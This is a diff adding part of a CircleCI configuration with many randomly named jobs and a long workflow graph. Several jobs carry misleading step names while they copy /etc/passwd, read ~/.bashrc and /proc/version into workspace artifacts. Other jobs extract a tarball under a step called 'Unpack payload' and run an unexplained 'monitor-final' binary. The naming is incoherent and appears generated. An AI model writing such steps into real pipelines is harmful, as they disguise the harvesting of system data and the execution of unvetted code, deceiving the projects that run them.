+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  LANGUAGE_AR_HU:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: REVOKE THREAT FEED START
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; printf '%s\n' "disk almost full" | cat -A; true ; } > /tmp/hub/1dd.PNG
+            du -b /tmp/hub/1dd.PNG
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '1dd.PNG'
+  rm-router-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/1dd.PNG 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  recBundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Preflight binning
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; grep --with-filename --ignore-case case ~/.bashrc|tail -n 3; true ; } > /tmp/hub/55.191.117
+            du -b /tmp/hub/55.191.117
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '55.191.117'
+  rocket:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/55.191.117 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  DAT_5af5aa:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Soon ingest the product catalog
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; (echo one; echo two) > '/tmp/laundry.out'; wc -l < '/tmp/laundry.out'; true ; } > /tmp/hub/0rchard
+            du -b /tmp/hub/0rchard
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '0rchard'
+  v7-nightly:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/0rchard 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+  Mountain:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: dl tokens 8
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; printf %s 'missing value' | sha1sum | awk '{print $1}'; true ; } > /tmp/hub/27.122.231
+            du -b /tmp/hub/27.122.231
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - '27.122.231'
+  API-480:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Fetch staged artifact
+          command: |
+            od -An -tc /tmp/hub/27.122.231 2>/dev/null | head -c 40 || true
+      - run:
+          name: Fetch working tree
+          command: git clone --depth 5 --quiet --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --gzip -f static-lake.tgz
+      - run:
+          command: /bin/sleep 30
+      - run:
+          command: "$PWD/monitor-final"
+
+  unwrap_uuid:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: BEGIN PROMOTE SIDECAR
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; cat /proc/version | awk '{print NF}' | sort -n | uniq; true ; } > /tmp/hub/viol37.lynx
+            du -b /tmp/hub/viol37.lynx
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'viol37.lynx'
+  balloon-char-bishop-atlas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: NET 5556
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; cp /etc/passwd /tmp/patches.tmp && sed -i 's/:x:/:*:/' /tmp/patches.tmp && head -n 3 /tmp/patches.tmp; true ; } > /tmp/hub/QKp
+            du -b /tmp/hub/QKp
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'QKp'
+  servoHdl:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Review the open invoices for audit
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; for entry in {0..10}; do printf '%02d\n' $entry; done | sort; true ; } > /tmp/hub/temp4f85fa9
+            du -b /tmp/hub/temp4f85fa9
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'temp4f85fa9'
+  cakstyntklaixo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/hub
+      - run:
+          name: Then unzip the scratch space
+          command: |
+            mkdir -p /tmp/hub
+            { set +o pipefail 2>/dev/null; touch '/tmp/sodaDownloadDeltav3.csv' && mv -v '/tmp/sodaDownloadDeltav3.csv' /tmp/newMember.copy; true ; } > /tmp/hub/TXN-32134-DJ
+            du -b /tmp/hub/TXN-32134-DJ
+      - persist_to_workspace:
+          root: /tmp/hub
+          paths:
+            - 'TXN-32134-DJ'
+workflows:
+  workflow:
+    jobs:
+      - hank99
+      - rl-2:
+          requires:
+            - hank99
+      - OPT_ID:
+          requires:
+            - hank99
+      - PROD_INIT_5:
+          requires:
+            - OPT_ID
+      - Src-Segment:
+          requires:
+            - OPT_ID
+      - RunStaging:
+          requires:
+            - Src-Segment
+      - NamedFakeArticleElement:
+          requires:
+            - Src-Segment
+      - DATA-761:
+          requires:
+            - NamedFakeArticleElement
+      - aa-37-b8:
+          requires:
+            - NamedFakeArticleElement
+      - tango-5:
+          requires:
+            - aa-37-b8
+      - recBundle:
+          requires:
+            - aa-37-b8
+      - rocket:
+          requires:
+            - recBundle
+      - device_unlock_eager:
+          requires:
+            - recBundle
+      - update-router:
+          requires:
+            - device_unlock_eager
+      - Mountain:
+          requires:
+            - device_unlock_eager
+      - API-480:
+          requires:
+            - Mountain
+      - BufferedMiddlewareProvider:
+          requires:
+            - Mountain
+      - update-webhook-reload:
+          requires:
+            - BufferedMiddlewareProvider
+      - sortlazy
+      - RUN_UAT:
+          requires:
+            - sortlazy
+      - DEPLOY_MUTEX:
+          requires:
+            - sortlazy
+      - alpha-v4:
+          requires:
+            - DEPLOY_MUTEX
+      - LANGUAGE_AR_HU:
+          requires:
+            - DEPLOY_MUTEX
+      - rm-router-leak:
+          requires:
+            - LANGUAGE_AR_HU
+      - reactor-button-seed-scarlet:
+          requires:
+            - LANGUAGE_AR_HU
+      - cd-v2:
+          requires:
+            - reactor-button-seed-scarlet
+      - rgChunk
+      - tam-run:
+          requires:
+            - rgChunk
+      - cq9:
+          requires:
+            - rgChunk
+      - STG_HOOK_4:
+          requires:
+            - cq9
+      - beginOptionPolicyDst:
+          requires:
+            - cq9
+      - prometheus-v2:
+          requires:
+            - beginOptionPolicyDst
+      - backport-new-kernel-zip:
+          requires:
+            - beginOptionPolicyDst
+      - tb-new:
+          requires:
+            - backport-new-kernel-zip
+      - closedInt:
+          requires:
+            - backport-new-kernel-zip
+      - INIT_UAT:
+          requires:
+            - closedInt
+      - voice_enemy:
+          requires:
+            - closedInt
+      - t-new:
+          requires:
+            - voice_enemy
+      - Split-ViewConfig:
+          requires:
+            - voice_enemy
+      - verify-nightly-release-candidate:
+          requires:
+            - Split-ViewConfig
+      - block--green:
+          requires:
+            - Split-ViewConfig
+      - v8-ga2:
+          requires:
+            - block--green
+      - xyz_v2
+      - produce-end-to-end-docker-image:
+          requires:
+            - xyz_v2
+      - HAVE_MIGRATION:
+          requires:
+            - xyz_v2
+      - yuki-push:
+          requires:
+            - HAVE_MIGRATION
+      - vicTheIron:
+          requires:
+            - HAVE_MIGRATION
+      - fiona-smoke:
+          requires:
+            - vicTheIron
+      - DAT_5af5aa:
+          requires:
+            - vicTheIron
+      - v7-nightly:
+          requires:
+            - DAT_5af5aa
+      - comment_list_file:
+          requires:
+            - DAT_5af5aa
+      - gating:
+          requires:
+            - comment_list_file
+      - i18n-ta
+      - unwrap_uuid:
+          requires:
+            - i18n-ta
+      - preview-v3:
+          requires:
+            - unwrap_uuid
+      - url34s:
+          requires:
+            - unwrap_uuid
+      - balloon-char-bishop-atlas:
+          requires:
+            - url34s
+      - Verify_Staging9:
+          requires:
+            - balloon-char-bishop-atlas
+      - lily-panel-rhythm-quill:
+          requires:
+            - balloon-char-bishop-atlas
+      - servoHdl:
+          requires:
+            - lily-panel-rhythm-quill
+      - assemble-nightly-integration-tests:
+          requires:
+            - servoHdl
+      - lockclock:
+          requires:
+            - servoHdl
+      - cakstyntklaixo:
+          requires:
+            - lockclock
+      - Build_Service9:
+          requires:
+            - cakstyntklaixo
